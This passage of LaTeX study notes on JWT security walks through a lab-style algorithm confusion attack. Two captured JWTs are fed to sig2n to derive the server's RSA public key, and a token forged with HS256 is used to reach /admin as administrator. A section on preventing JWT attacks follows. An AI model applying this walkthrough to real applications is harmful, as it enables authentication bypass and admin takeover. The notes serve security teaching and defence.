+\begin{lstlisting}[caption=Running sig2n with Docker]
+docker run --rm -it portswigger/sig2n <token1> <token2>
+\end{lstlisting}
+
+\begin{notebox}[First Run]
+The first time you run this command, it will automatically pull the image from Docker Hub, which may take a few minutes.
+\end{notebox}
+
+\subsection{How It Works}
+
+The tool uses two valid JWTs from the server to calculate potential values of \texttt{n} (the RSA modulus). For each potential value, it outputs:
+
+\begin{itemize}
+    \item A Base64-encoded PEM key in both \textbf{X.509} and \textbf{PKCS1} formats
+    \item A forged JWT signed using each key
+\end{itemize}
+
+\subsection{Practical Attack Steps}
+
+\subsubsection{Step 1: Collect Two Valid JWTs}
+
+\begin{enumerate}
+    \item Log in to your account and capture the JWT session cookie
+    \item Log out and log in again to get a second JWT
+    \item Save both tokens for later use
+\end{enumerate}
+
+\subsubsection{Step 2: Run the Tool}
+
+\begin{lstlisting}[caption=Example Command]
+docker run --rm -it portswigger/sig2n eyJhbGciOiJSUzI1NiJ9.eyJpc3Mi... eyJhbGciOiJSUzI1NiJ9.eyJpc3Mi...
+\end{lstlisting}
+
+The output contains:
+\begin{itemize}
+    \item Multiple mathematically possible \texttt{n} values
+    \item Only ONE matches the server's actual key
+    \item Each comes with Base64-encoded keys and forged JWTs
+\end{itemize}
+
+\subsubsection{Step 3: Identify the Correct Key}
+
+\begin{enumerate}
+    \item Copy the tampered JWT from the first \textbf{X.509} entry
+    \item In Burp Repeater, replace your session cookie with this JWT
+    \item Send a request to an endpoint (e.g., \texttt{/my-account})
+\end{enumerate}
+
+\begin{attackbox}[Identifying the Correct Key]
+\begin{itemize}
+    \item \textbf{200 OK} response --> This is the correct X.509 key 
+    \item \textbf{302 Redirect} to login --> Wrong key 
+\end{itemize}
+If incorrect, repeat with the next X.509 key from the output.
+\end{attackbox}
+
+\subsubsection{Step 4: Create a Symmetric Key in JWT Editor}
+
+Once you've identified the correct key:
+
+\begin{enumerate}
+    \item From the terminal, copy the \textbf{Base64-encoded X.509 key} (not the tampered JWT)
+    \item In Burp, go to \textbf{JWT Editor Keys} tab
+    \item Click \textbf{New Symmetric Key} → \textbf{Generate}
+    \item Replace the \texttt{k} property value with the Base64-encoded key
+    \begin{verbatim}
+    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvK3l5MXdwWW1mZmdYQnhoQVVKegpISG9jQ3VKb2x3RHFxbDc1Wld1Q1EvY2IzMksydmg5bWs2R1BNOWdOTjRZL3FUVlg2N1doc04zSnZhRll3K2ZoCnZzV1EuLi4KLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
+    \end{verbatim}
+    \item Click \textbf{OK} to save
+\end{enumerate}
+
+\subsubsection{Step 5: Modify and Sign the Token}
+
+\begin{enumerate}
+    \item In Burp Repeater, change the path to \texttt{/admin}
+    \item Switch to \textbf{JSON Web Token} editor tab
+    \item Ensure \texttt{alg} header is set to \textbf{HS256}
+    \item In payload, change \texttt{sub} to \textbf{administrator}
+    \item Click \textbf{Sign}
+    \item Select the symmetric key you just created
+    \item Ensure \textbf{Don't modify header} is selected
+    \item Click \textbf{OK} and Send the request to access the admin panel
+\end{enumerate}
+
+\begin{notebox}[Key Takeaway]
+Even when the public key isn't exposed, having just two valid JWTs is enough to derive the key and perform an algorithm confusion attack.
+\end{notebox}
+
+\section{How to Prevent JWT Attacks}
+
+\subsection{Essential Security Measures}
+
+\subsubsection{1. Use Up-to-Date Libraries}
+\begin{itemize}
+    \item Always use the latest version of established JWT libraries
+    \item Ensure developers understand the library's security implications
+    \item Modern libraries include protections, but aren't foolproof due to specification flexibility
+\end{itemize}
+
+\subsubsection{2. Robust Signature Verification}
+\begin{itemize}
+    \item Always verify signatures on every received JWT
+    \item Account for edge-cases (unexpected algorithms, missing signatures)
+    \item Never trust the \texttt{alg} parameter blindly
+\end{itemize}
+
+\subsubsection{3. Strict Header Validation}
+
+\textbf{For \texttt{jku} (JWK Set URL):}
+\begin{itemize}
+    \item Maintain a strict whitelist of permitted domains
+    \item Validate URLs against the whitelist before fetching
+    \item Use URL parsing, not string matching, to prevent bypasses
+\end{itemize}
+
+\textbf{For \texttt{kid} (Key ID):}
+\begin{itemize}
+    \item Don't use user input to construct file paths
+    \item If necessary, validate against a whitelist of allowed values
+    \item Sanitize input to prevent path traversal (../)
+    \item Use parameterized queries if \texttt{kid} references a database
+\end{itemize}
+
+\subsubsection{4. Algorithm Enforcement}
+\begin{itemize}
+    \item Reject \texttt{alg: none} tokens completely
+    \item Don't allow algorithm switching (RS256 → HS256)
+    \item Use separate verification methods for different algorithm types
+\end{itemize}
+
+\subsection{Additional Best Practices}
+
+\subsubsection{5. Token Expiration}
+\begin{itemize}
+    \item Always set an \texttt{exp} (expiration) claim
+    \item Use short-lived tokens (minutes/hours, not days/weeks)
+    \item Implement refresh token mechanisms for longer sessions
+\end{itemize}
+
+\subsubsection{6. Secure Token Transmission}
+\begin{itemize}
+    \item Avoid sending tokens in URL parameters (they appear in logs)
+    \item Use secure, HTTP-only cookies
+    \item Always transmit over HTTPS/TLS
+    \item Set appropriate cookie flags: \texttt{Secure}, \texttt{HttpOnly}, \texttt{SameSite}
+\end{itemize}
+
+\subsubsection{7. Key Management}
+\begin{itemize}
+    \item Use strong, unpredictable secret keys for symmetric algorithms
+    \item Regularly rotate keys
+    \item Store keys securely (environment variables, key management services)
+    \item Use asymmetric algorithms (RS256, ES256) when possible
+\end{itemize}
+
+\begin{attackbox}[Remember]
+Security is layered. Implementing all these measures provides defense-in-depth. Even if one control fails, others may still protect you.
+\end{attackbox}
+
+\subsection{Common Pitfalls to Avoid}
+
+\begin{itemize}
+    \item \textbf{Don't} trust user-controlled input for cryptographic decisions
+    \item \textbf{Don't} use the same key for multiple purposes
+    \item \textbf{Don't} ignore library updates and security patches
+    \item \textbf{Don't} assume JWTs are encrypted (they're just encoded)
+    \item \textbf{Don't} accept tokens without signature verification
+    \item \textbf{Don't} use predictable secrets or keys
+\end{itemize}
+
+\begin{notebox}[Final Thought]
+JWTs are a tool, not a silver bullet. Understanding their security implications is essential for building secure applications. When in doubt, follow the principle of least privilege and validate everything.
+\end{notebox}
+
+\end{document}
